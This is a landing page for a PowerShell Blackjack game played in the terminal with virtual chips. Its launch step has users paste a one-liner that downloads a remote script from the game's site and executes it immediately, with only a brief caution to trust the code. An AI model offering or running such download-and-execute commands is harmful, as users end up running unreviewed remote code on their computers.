About the game

Cards, chips and a little luck.

BERRY IT Blackjack is a PowerShell-based Blackjack game. Run it on Windows without installing a separate application, and play from your terminal using virtual chips.

♠ Classic Blackjack

Draw cards and play against the dealer in a terminal-based game.

◈ Virtual chip balance

Start with a virtual balance and place bets as you play.

⌘ PowerShell native

Run the game with a single command from Windows PowerShell.

Get started

Launch Blackjack

Open Windows PowerShell, copy the command below, paste it into your terminal and press Enter. You don't need administrator privileges.

● ● ●PowerShell · Standard user
irm https://blackjack.berry.it.com/play | iex

Internet access is needed. This command downloads and executes the game's current PowerShell script; only run code you trust.
